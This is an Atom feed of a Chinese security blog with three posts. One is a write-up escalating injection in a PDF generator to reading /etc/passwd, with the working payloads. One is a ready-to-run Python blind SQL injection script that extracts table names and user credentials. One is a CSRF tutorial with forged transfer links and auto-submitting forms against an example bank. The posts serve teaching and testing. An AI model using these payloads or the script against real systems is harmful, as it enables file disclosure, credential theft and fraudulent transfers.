<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Vulnner</title>
  
  
  <link href="https://vulnner.github.io/atom.xml" rel="self"/>
  
  <link href="https://vulnner.github.io/"/>
  <updated>2021-12-21T14:54:54.587Z</updated>
  <id>https://vulnner.github.io/</id>
  
  <author>
    <name>vulnner</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS到服务端任意文件读取</title>
    <link href="https://vulnner.github.io/2021/12/21/XSS%E5%88%B0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>https://vulnner.github.io/2021/12/21/XSS%E5%88%B0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</id>
    <published>2021-12-21T14:53:49.000Z</published>
    <updated>2021-12-21T14:54:54.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PDF生成漏洞：从XSS到服务端任意文件读取"><a href="#PDF生成漏洞：从XSS到服务端任意文件读取" class="headerlink" title="PDF生成漏洞：从XSS到服务端任意文件读取"></a>PDF生成漏洞：从XSS到服务端任意文件读取</h2><h3 id="一、-前言"><a href="#一、-前言" class="headerlink" title="一、 前言"></a>一、 前言</h3><p>XSS是最为常见的Web漏洞之一，多年来连续入选OWASP TOP 10，相信大家都耳熟能详。</p><p>它是一种代码注入类的攻击，是一种客户端侧的攻击，攻击者通过在Web应用中注入恶意JavaScript代码，通过点击URL，最终在受害者浏览器端执行的一种漏洞。主要有反射型XSS、存储型XSS、基于DOM的XSS三类。</p><p>XSS一些比较常规的危害大概有：重定向浏览器、窃取Cookie、浏览器劫持等。</p><p>与常规的XSS介绍不同，本篇文章侧重于发现XSS后的进一步利用。</p><p>主要介绍在某次实际测试过程中，发现XSS漏洞之后，如何进一步的利用，最终通过XSS达到服务端任意文件读取的危害。</p><h3 id="二、-漏洞详情"><a href="#二、-漏洞详情" class="headerlink" title="二、 漏洞详情"></a>二、 漏洞详情</h3><p>在某个Web站点中，发现了一处可以让我们下载PDF的功能，大概的URL如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=testxyz&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p>测试过程中发现，URL中的<code>utrnumber</code>字段的值在PDF文件中被渲染，所以尝试用类似<code>&quot;&gt;&lt;s&gt;aaa</code>这样的html代码来当做该字段的值，也就是如下的URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=&quot;&gt;&lt;s&gt;aaa&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p>访问该URL，打开获取到的PDF文件，发现<code>&quot;&gt;&lt;s&gt;aaa</code>被当做HTML渲染，这就导致了XSS。结果如下：</p><p><img src="/.io//image-20211023174701560.png" alt="image-20211023174701560"></p><p>尝试过用<code>&lt;iframe&gt;</code>来探测内网和file协议来读取文件，但都失败了。</p><p>在此之后，尝试使用JavaScript来进行进一步的探索，但是目前不不确定PDF的渲染过程中，是否执行了JavaScript脚本。所以尝试使用如下脚本来观察JS是否成功执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test&#x27;</span>).innerHTML=<span class="string">&#x27;aaaa&#x27;</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- or this --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">document.write(</span>&quot;<span class="attr">aaaa</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure><p>对应URL为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=&lt;img src=x onerror=document.write(&quot;aaaa&quot;)&gt;&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20211023175134382.png" alt="image-20211023175134382"></p><p>观察到JavaScript脚本成功执行。</p><p>接下来，检查了一下JavaScript执行所在context，令人惊喜的是这段脚本，在服务端是在**<code>file://</code>**下执行的，这也就意味着我们或许可以借此来达到任意文件读取的效果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=&lt;img src=x onerror=document.write(&lt;img src=x onerror=document.write(&#x27;aaaa&#x27;%2bwindow.location)&gt;)&gt;&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20211023175525094.png" alt="image-20211023175525094"></p><p>接下来，尝试通过 XHR(XMLHttpRequest)来读取服务器端文件的内容，简单的PoC如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    x=<span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="javascript">    x.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)</span></span><br><span class="line"><span class="javascript">&#125;;</span></span><br><span class="line"><span class="javascript">    x.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);</span></span><br><span class="line"><span class="javascript">    x.send();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也即访问如下URL，下载对应的PDF文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/pay/downloadStatements?Id=xxxx&amp;utrnumber=&lt;script&gt;x=new XMLHttpRequest;x.onload=function()&#123;document.write(this.responseText)&#125;;x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt;&amp;date=2020-08-17</span><br></pre></td></tr></table></figure><p>接下来查看对应 的PDF文件内容，发现成功读取到了passwd文件的内容</p><p><img src="/.io//image-20211023175853358.png" alt="image-20211023175853358"></p><p>至此，我们就完成了服务端XSS到服务端的任意文件读取，然后就能读取服务器上随便一个文件的内容啦。</p><h3 id="三、-总结"><a href="#三、-总结" class="headerlink" title="三、 总结"></a>三、 总结</h3><p>XSS是Web中很常见的一种漏洞，我们在日常的漏洞挖掘中，如果发现了XSS，不妨结合具体的应用功能做进一步的挖掘，尝试扩大XSS的危害，本次挖掘就利用XSS达到了的服务端任意文件读取的效果。</p><p>参考/学习资料：</p><ul><li><a href="https://www.aptive.co.uk/blog/xss-cross-site-scripting/">https://www.aptive.co.uk/blog/xss-cross-site-scripting/</a></li><li><a href="https://www.bugcrowd.com/resources/webinars/cross-site-scripting/">https://www.bugcrowd.com/resources/webinars/cross-site-scripting/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PDF生成漏洞：从XSS到服务端任意文件读取&quot;&gt;&lt;a href=&quot;#PDF生成漏洞：从XSS到服务端任意文件读取&quot; class=&quot;headerlink&quot; title=&quot;PDF生成漏洞：从XSS到服务端任意文件读取&quot;&gt;&lt;/a&gt;PDF生成漏洞：从XSS到服务端任意文件</summary>
      
    
    
    
    
    <category term="web" scheme="https://vulnner.github.io/tags/web/"/>
    
    <category term="vulns" scheme="https://vulnner.github.io/tags/vulns/"/>
    
  </entry>
  
  <entry>
    <title>sql盲注脚本记录</title>
    <link href="https://vulnner.github.io/2021/11/20/sql%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/"/>
    <id>https://vulnner.github.io/2021/11/20/sql%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/</id>
    <published>2021-11-20T09:42:58.000Z</published>
    <updated>2021-11-20T09:48:05.426Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下sql盲注时爆破数据库名、表名的脚本，提供了线性遍历和二分法两种。</p><p>与<code>substr</code>类似的还有<code>mid</code>，<code>substring</code>, <code>mid</code>等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://127.0.0.1/sqli/sql2.php?id=2&quot;</span></span><br><span class="line">mark = <span class="string">&quot;have fun&quot;</span></span><br><span class="line">db_payload = <span class="string">&quot;&#x27;+and+ascii(substr(database(),&#123;&#125;,1))&#123;&#125;&#123;&#125;--+&quot;</span> <span class="comment"># &gt; or =</span></span><br><span class="line">table_payload = <span class="string">&quot;&#x27;+and+ascii(substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),&#123;&#125;,1))&#123;&#125;&#123;&#125;--+&quot;</span> <span class="comment"># &gt; or =</span></span><br><span class="line"><span class="comment"># select group_concat(column_name) from information_schema.columns where table_name = &#x27;wp_user&#x27;</span></span><br><span class="line">col_payload = <span class="string">&quot;&#x27;+and+ascii(substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;wp_user&#x27;),&#123;&#125;,1))&#123;&#125;&#123;&#125;--+&quot;</span></span><br><span class="line"><span class="comment"># select concat(user,0x7e,pwd) from wp_user</span></span><br><span class="line">data_payload = <span class="string">&quot;&#x27;+and+ascii(substr((select+concat(user,0x7e,pwd)+from+wp_user),&#123;&#125;,1))&#123;&#125;&#123;&#125;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">measure_time</span>(<span class="params">func</span>):</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    func()</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cost time: &#123;&#125; seconds&quot;</span>.<span class="built_in">format</span>(end-start))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">probe_linear</span>(<span class="params"><span class="built_in">type</span>, payload</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    exit_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> exit_flag:</span><br><span class="line">        exit_flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            param = payload.<span class="built_in">format</span>(j, <span class="string">&#x27;=&#x27;</span>, i)</span><br><span class="line">            r = requests.get(base_url+param)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">type</span>, name))</span><br><span class="line">                exit_flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">probe_binary</span>(<span class="params"><span class="built_in">type</span>, payload</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    exit_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> exit_flag:</span><br><span class="line">        exit_flag = <span class="literal">True</span></span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> high &gt;= low:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            param = payload.<span class="built_in">format</span>(j, <span class="string">&#x27;=&#x27;</span>, mid)</span><br><span class="line">            r = requests.get(base_url + param)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name += <span class="built_in">chr</span>(mid)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">type</span>, name))</span><br><span class="line">                exit_flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            param = payload.<span class="built_in">format</span>(j, <span class="string">&#x27;&gt;&#x27;</span> ,mid)</span><br><span class="line">            r = requests.get(base_url+param)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid -<span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    measure_time(<span class="keyword">lambda</span>: probe_binary(<span class="string">&#x27;table_name&#x27;</span>, table_payload))</span><br><span class="line">    measure_time(<span class="keyword">lambda</span>: probe_binary(<span class="string">&#x27;col_name&#x27;</span>, col_payload))</span><br><span class="line">    measure_time(<span class="keyword">lambda</span>: probe_binary(<span class="string">&#x27;data&#x27;</span>, data_payload))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一下sql盲注时爆破数据库名、表名的脚本，提供了线性遍历和二分法两种。&lt;/p&gt;
&lt;p&gt;与&lt;code&gt;substr&lt;/code&gt;类似的还有&lt;code&gt;mid&lt;/code&gt;，&lt;code&gt;substring&lt;/code&gt;, &lt;code&gt;mid&lt;/code&gt;等。&lt;/p&gt;
&lt;fi</summary>
      
    
    
    
    <category term="sql" scheme="https://vulnner.github.io/categories/sql/"/>
    
    
    <category term="basic" scheme="https://vulnner.github.io/tags/basic/"/>
    
    <category term="web" scheme="https://vulnner.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CSRF教程</title>
    <link href="https://vulnner.github.io/2021/11/08/CSRF%E6%95%99%E7%A8%8B/"/>
    <id>https://vulnner.github.io/2021/11/08/CSRF%E6%95%99%E7%A8%8B/</id>
    <published>2021-11-08T13:02:21.000Z</published>
    <updated>2021-11-08T13:36:12.353Z</updated>
    
    <content type="html"><![CDATA[<p>CSRF，跨站请求伪造，是一种在认证用户无感知的情况下，执行一些列操作。在一点点社工手段的帮助下，攻击者可以trick用户去执行攻击者想让他们执行的Web操作。</p><p>如果受害者是一个正常的用户，攻击者可以让他们执行一些改变状态的请求，比如转账、修改个人信息等。</p><p>而如果受害者是一个网站管理员，CSRF可搞的东西就多了，甚至可以干掉这个Web应用。不过前提是，要知道请求和api和对应的参数。</p><h2 id="description"><a href="#description" class="headerlink" title="description"></a>description</h2><p>CSRF，是一种欺骗受害者去执行恶意请求的攻击，主要是让认证的用户去执行非预期的功能。对于大多数的站点，浏览器会自动发送请求所需要的凭证，比如cookie、ip地址、windows域凭证等。</p><p>所以，如果用户已经在该站点正常登陆，这个站点无法区分伪造的请求和合法的请求。</p><p>CSRF攻击的目标，主要是改变状态的请求，因为一般情况下，CSRF对于获取敏感数据无能为力(因为拿不到啊)。</p><p>不过，有一种login csrf攻击。大概是攻击者让未认证的用户登录攻击者的常昊，如果受害者没有意识到登陆了别人的帐号，后续如果他们添加了一些个人信息，那么攻击者再登录这个帐号，就能查看敏感数据了。</p><p>还有一种存储型的CSRF，比如有的地方可以通过html标签来加载图片，别人可以访问这个页面。那么就可以把img或iframe指向精心构造的地址，其他人访问就会发起请求。</p><h2 id="misunderstanding"><a href="#misunderstanding" class="headerlink" title="misunderstanding"></a>misunderstanding</h2><p>有一些看似有用的防御措施，或者错误观念，下面来简单说一下，避雷避雷。</p><ul><li><p>使用secret cookie</p><p>所有的cookie，都会被发送给服务器，即便是那个secret one。</p><p>session id也无法区分用户的请求是否出自本意。</p></li><li><p>只接受post请求</p><p>这也是一个常见的误区，觉得只有GET请求才会导致CSRF，但并非如此，攻击者可以在自己的页面上挂一个恶意的表单，然后自动提交，受害者访问这个页面就会无意识的发起请求。</p></li><li><p>多步骤交易</p><p>多步骤的交易并不能有效防御CSRF，因为有时攻击者可以预测到每个步骤。</p></li><li><p>url rewriting</p><p>这个看起来似乎可以有效防御CSRF，因为攻击者无法猜测受害者的session id。然而，这就将用户的session id暴露在了URL中，引入了新的安全问题——url参数传递敏感数据(可能会被记录在第三方的日志中)。</p></li><li><p>https</p><p>https是常见的误区了。。。</p></li></ul><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>先来假设一个场景：Alice想要给Bob转账100刀，使用的站点时bank.com。攻击者Maria，想要Alice把钱转给自己，可能的攻击步骤如下：</p><ol><li>构造exploit URL或script</li><li>通过社工，诱使Alice点击这个URL。</li></ol><h3 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h3><p>比如正常转账，要发起如下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">http://bank.com/transfer.do?acct=BOB&amp;amount=100</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>那么，Maria就可以构造如下URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bank.com/transfer.do?acct=MARIA&amp;amount=100000</span><br></pre></td></tr></table></figure><p>接下来的利用：</p><ul><li>发送带有HTML内容的邮件</li><li>在受害者可能访问的页面中植入URL或script</li></ul><p>exploit URL可以为转成正常的连接，然后诱使受害者点击，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://bank.com/transfer.do?acct=MARIA&amp;amount=100000&quot;</span>&gt;</span>View my Pictures!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 或者fake image --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://bank.com/transfer.do?acct=MARIA&amp;amount=100000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将这些内容包含在邮件中，比如img的内容，Alice访问邮件后不会看到任何东西，但是浏览器会提交这个请求给<code>bank.com</code>，进而转账给Maria。</p><h3 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h3><p>针对POST请求和GET请求的攻击，不同之处在于如何被受害者触发。下面假设银行使用有问题的POST请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://bank.com/transfer.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="ini"><span class="attr">acct</span>=BOB&amp;amount=<span class="number">100</span></span></span><br></pre></td></tr></table></figure><p>这种请求，不能被标准的<code>&lt;a&gt;</code>或者<code>&lt;img&gt;</code>标签来传递，但可以使用<code>&lt;form&gt;</code>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.com/transfer.do&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;acct&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MARIA&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100000&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;View my pictures&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这可能需要用户去点击表单的提交按钮，不过也可以使用JS自动提交表单。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其他HTTP方法"><a href="#其他HTTP方法" class="headerlink" title="其他HTTP方法"></a>其他HTTP方法</h3><p>假设银行用户的PUT方法，JSON作为body。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">http://bank.com/transfer.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="json">&#123; <span class="attr">&quot;acct&quot;</span>:<span class="string">&quot;BOB&quot;</span>, <span class="attr">&quot;amount&quot;</span>:<span class="number">100</span> &#125;</span></span><br></pre></td></tr></table></figure><p>这种请求，可以通过嵌在页面里的JS来发送：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    x.open(<span class="string">&quot;PUT&quot;</span>,<span class="string">&quot;http://bank.com/transfer.do&quot;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    x.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span></span><br><span class="line"><span class="javascript">    x.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">&quot;acct&quot;</span>:<span class="string">&quot;BOB&quot;</span>, <span class="string">&quot;amount&quot;</span>:<span class="number">100</span>&#125;)); </span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;put()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不过，现在的浏览器都有同源策略的限制，上面这个请求不会被执行。默认情况下是会被限制的，但如果站点存在CORS的配置问题，就会被触发。(或者XSS，将JS嵌入到bank站点，就不会有同源策略的问题)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>[reflect]</span><br></pre></td></tr></table></figure><h2 id="prevent"><a href="#prevent" class="headerlink" title="prevent"></a>prevent</h2><ul><li>验证referer</li><li>加验证码等交互性内容</li><li>请求体/请求头中携带secret字段</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CSRF，跨站请求伪造，是一种在认证用户无感知的情况下，执行一些列操作。在一点点社工手段的帮助下，攻击者可以trick用户去执行攻击者想让他们执行的Web操作。&lt;/p&gt;
&lt;p&gt;如果受害者是一个正常的用户，攻击者可以让他们执行一些改变状态的请求，比如转账、修改个人信息等。&lt;/</summary>
      
    
    
    
    
    <category term="Web" scheme="https://vulnner.github.io/tags/Web/"/>
    
    <category term="basic" scheme="https://vulnner.github.io/tags/basic/"/>
    
  </entry>
  
</feed>
